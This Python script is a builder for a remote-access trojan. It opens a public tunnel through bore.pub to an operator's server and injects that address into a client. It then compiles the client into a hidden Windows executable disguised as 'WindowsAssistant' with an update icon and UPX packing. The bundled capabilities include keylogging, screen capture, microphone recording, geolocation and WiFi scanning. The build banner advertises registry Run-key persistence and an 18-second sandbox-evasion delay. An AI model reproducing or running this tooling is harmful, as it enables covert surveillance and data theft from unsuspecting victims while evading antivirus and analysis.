import os
import sys
import subprocess
import re
import urllib.request
import zipfile
import time
import shutil
import queue
import threading

def setup_bore():
    """Downloads and sets up bore tunneling tool"""
    url = "https://github.com/ekzhang/bore/releases/download/v0.5.2/bore-v0.5.2-x86_64-pc-windows-msvc.zip"
    zip_path = "bore.zip"
    exe_path = "bore.exe"
    
    if not os.path.exists(exe_path):
        print("[*] Downloading Bore (A free Ngrok alternative without accounts)...")
        urllib.request.urlretrieve(url, zip_path)
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(".")
        os.remove(zip_path)
    return exe_path

def start_bore(exe_path):
    """Starts bore and extracts the public URL/Port with timeout handling"""
    print("[*] Starting TCP Tunnel...")
    # Start bore in the background
    proc = subprocess.Popen([exe_path, "local", "5000", "--to", "bore.pub"], 
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    server_ip = "bore.pub"
    server_port = None
    
    # Use a queue and a daemon thread to read lines asynchronously (prevents blocking forever)
    q = queue.Queue()
    def enqueue_output(out, queue):
        try:
            for line in iter(out.readline, ''):
                queue.put(line)
        except Exception:
            pass
        finally:
            out.close()
        
    t = threading.Thread(target=enqueue_output, args=(proc.stdout, q))
    t.daemon = True
    t.start()
    
    # Wait up to 15 seconds total to find the port
    start_time = time.time()
    while time.time() - start_time < 15:
        # Check if process died early
        if proc.poll() is not None:
            break
            
        try:
            line = q.get_nowait()
        except queue.Empty:
            time.sleep(0.1)
            continue
            
        # Example output: INFO bore_cli::client: listening at bore.pub:45678
        if "listening at bore.pub:" in line:
            server_port = int(line.strip().split(":")[-1])
            break
            
    if not server_port:
        proc.kill()
        # Read any remaining error logs from queue if possible to help diagnose
        err_msg = ""
        while not q.empty():
            err_msg += q.get_nowait()
        if err_msg:
            raise Exception(f"Failed to get a port from bore.pub. Logs:\n{err_msg.strip()}")
        raise Exception("Failed to get a port from bore.pub (timeout or connection failed)")
        
    return proc, server_ip, server_port

def main():
    print("=== Ultimate Auto-Client Builder ===")
    print("This will completely automate tunneling and building the .exe without any accounts or passwords!\n")
    
    try:
        exe_path = setup_bore()
        bore_proc, server_ip, server_port = start_bore(exe_path)
    except Exception as e:
        print(f"[-] Error setting up tunnel: {e}")
        return
        
    print(f"\n[+] SUCCESS! Public Tunnel Established!")
    print(f"    Host: {server_ip}")
    print(f"    Port: {server_port}")
    
    # Now proceed to build the exe
    original_file = "client.py"
    temp_file = "client_build_temp.py"
    exe_name = "WindowsAssistant"
    build_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "build")
    dist_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dist")
    
    if not os.path.exists(original_file):
        print(f"\n[-] Error: {original_file} not found.")
        bore_proc.kill()
        return
        
    try:
        with open(original_file, "r", encoding="utf-8") as f:
            content = f.read()
            
        # Inject IP and PORT
        content = re.sub(r'SERVER_IP\s*=\s*["\'][^"\']*["\']', f'SERVER_IP = "{server_ip}"', content)
        content = re.sub(r'PORT\s*=\s*\d+', f'PORT = {server_port}', content)
        
        with open(temp_file, "w", encoding="utf-8") as f:
            f.write(content)
            
        print("\n[*] Checking PyInstaller...")
        try:
            import PyInstaller
        except ImportError:
            print("[*] Installing PyInstaller...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller", "-q"])
        
        print("[*] Checking extra dependencies for build...")
        extra_pkgs = []
        # Check all required dependencies of client.py
        for mod, pkg in [
            ("pynput", "pynput"), 
            ("sounddevice", "sounddevice"), 
            ("PIL", "Pillow"), 
            ("mss", "mss"), 
            ("numpy", "numpy"), 
            ("psutil", "psutil")
        ]:
            try:
                __import__(mod)
            except ImportError:
                extra_pkgs.append(pkg)
        if extra_pkgs:
            print(f"[*] Installing: {', '.join(extra_pkgs)}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-q"] + extra_pkgs)
            print("[+] Dependencies installed")
                
        print("\n[*] Building executable... Please wait (this takes about 30 seconds)...")
        
        icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "update_icon.ico")
        upx_path  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "upx.exe")
        
        # Overwrite protection: check if dist/WindowsAssistant.exe exists and try to clean it
        dest_exe = os.path.join(dist_dir, f"{exe_name}.exe")
        if os.path.exists(dest_exe):
            print(f"[*] Found existing executable at {dest_exe}. Attempting to remove it...")
            try:
                os.remove(dest_exe)
            except Exception as e:
                print(f"[-] Warning: Could not remove existing executable (it might be running or locked): {e}")
        
        pyinstaller_cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole",
            "--noconfirm",  # Auto-overwrite without prompt to prevent hanging
            "--name", exe_name,
        ]
        
        # Graceful fallback if icon is missing
        if os.path.exists(icon_path):
            pyinstaller_cmd.append(f"--icon={icon_path}")
        else:
            print("[-] Warning: update_icon.ico not found. Proceeding without custom icon.")
            
        # UPX compression check
        if os.path.exists(upx_path):
            pyinstaller_cmd.append(f"--upx-dir={os.path.dirname(upx_path)}")
            
        pyinstaller_cmd += [
            # ── Screenshot (Pillow) ─────────────────────────────────────────────
            "--hidden-import", "PIL",
            "--hidden-import", "PIL.ImageGrab",
            "--hidden-import", "PIL.Image",
            "--hidden-import", "PIL.ImageTk",
            "--hidden-import", "PIL.ImageFilter",
            "--hidden-import", "PIL.ImageEnhance",
            # ── Screenshot fallback (mss) ──────────────────────────────────────
            "--hidden-import", "mss",
            # ── Microphone (sounddevice + numpy) ────────────────────────────────
            "--hidden-import", "sounddevice",
            "--hidden-import", "_sounddevice_data",
            "--hidden-import", "numpy",
            # ── Keylog (pynput) ─────────────────────────────────────────────────
            "--hidden-import", "pynput",
            "--hidden-import", "pynput.keyboard",
            "--hidden-import", "pynput.keyboard._win32",
            "--hidden-import", "pynput.keyboard._xorg",
            "--hidden-import", "pynput.keyboard._darwin",
            "--hidden-import", "pynput.mouse",
            # ── psutil (process inspector) ──────────────────────────────────────
            "--hidden-import", "psutil",
            # ── Registry (winreg) ────────────────────────────────────────────────
            "--hidden-import", "winreg",
            # ── GeoLocation + BeaconDB (urllib / json / ctypes) ─────────────────
            "--hidden-import", "urllib",
            "--hidden-import", "urllib.request",
            "--hidden-import", "urllib.parse",
            "--hidden-import", "json",
            "--hidden-import", "ctypes",
            "--hidden-import", "ctypes.wintypes",
            # ── Privilege Inspector (winreg + subprocess already included) ────────
            "--hidden-import", "struct",
            # ── WiFi scan (subprocess + re already included) ──────────────────────
            "--hidden-import", "re",
            # ── GUI library (tkinter) ────────────────────────────────────────────
            "--hidden-import", "tkinter",
            "--hidden-import", "tkinter.messagebox",
            "--hidden-import", "tkinter.filedialog",
            # ── pynput — collect ALL platform backends ───────────────────────────
            "--hidden-import", "pynput.keyboard._win32",
            "--hidden-import", "pynput.mouse._win32",
            "--collect-all", "pynput",
            temp_file
        ]
        
        # Run PyInstaller and capture stdout/stderr, only print on failure
        proc = subprocess.Popen(pyinstaller_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = proc.communicate()
        
        if proc.returncode != 0:
            print(f"\n[-] Build failed (error code: {proc.returncode}).")
            print("--- PyInstaller Build Output (Stdout) ---")
            print(stdout)
            print("--- PyInstaller Build Errors (Stderr) ---")
            print(stderr)
            bore_proc.kill()
            return
            
        # Verify if final exe actually exists
        if not os.path.exists(dest_exe):
            print(f"\n[-] Error: Build completed but final executable {dest_exe} was not found (it may have been deleted by antivirus).")
            bore_proc.kill()
            return
            
        print("\n[+] ========================================= [+]")
        print("   SUCCESS! Executable successfully compiled!   ")
        print(f"   Name: {exe_name}.exe                         ")
        print("   Location: ./dist/                            ")
        print(f"   Icon: {'YES (update_icon.ico)' if os.path.exists(icon_path) else 'NO (Default)'}                      ")
        print(f"   UPX: {'YES' if os.path.exists(upx_path) else 'NO'} compressed                           ")
        print(f"   Persistence: YES (HKCU Run on startup)        ")
        print(f"   Delay: YES (18s sandbox evasion)              ")
        print("[+] ========================================= [+]")
        
    except Exception as e:
        print(f"\n[-] An error occurred during the build process: {e}")
        try:
            bore_proc.kill()
        except Exception:
            pass
        return
        
    finally:
        # Guarantee cleanup of temporary files
        print("[*] Cleaning up temporary build files...")
        if os.path.exists(temp_file):
            try:
                os.remove(temp_file)
            except Exception as e:
                print(f"[-] Warning: Failed to remove temp file {temp_file}: {e}")
                
        if os.path.exists(f"{exe_name}.spec"):
            try:
                os.remove(f"{exe_name}.spec")
            except Exception as e:
                print(f"[-] Warning: Failed to remove spec file: {e}")
                
        # Clear build directory and logs
        build_folder = os.path.join(build_dir, exe_name)
        if os.path.exists(build_folder):
            try:
                shutil.rmtree(build_folder)
            except Exception as e:
                print(f"[-] Warning: Failed to remove build cache folder: {e}")
                
        if os.path.exists(build_dir) and not os.listdir(build_dir):
            try:
                os.rmdir(build_dir)
            except Exception:
                pass
                
    print("\n[*] The TCP tunnel is currently ACTIVE.")
    print("[*] Keep this window open! If you close it, the tunnel will stop and the .exe won't be able to connect.")
    print("[*] Start your server (server.py) on port 5000 in a new terminal now!")
    print("[*] Press Ctrl+C here to stop the tunnel when you are done.")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Closing tunnel...")
        bore_proc.kill()
        print("[+] Tunnel closed.")

if __name__ == "__main__":
    main()
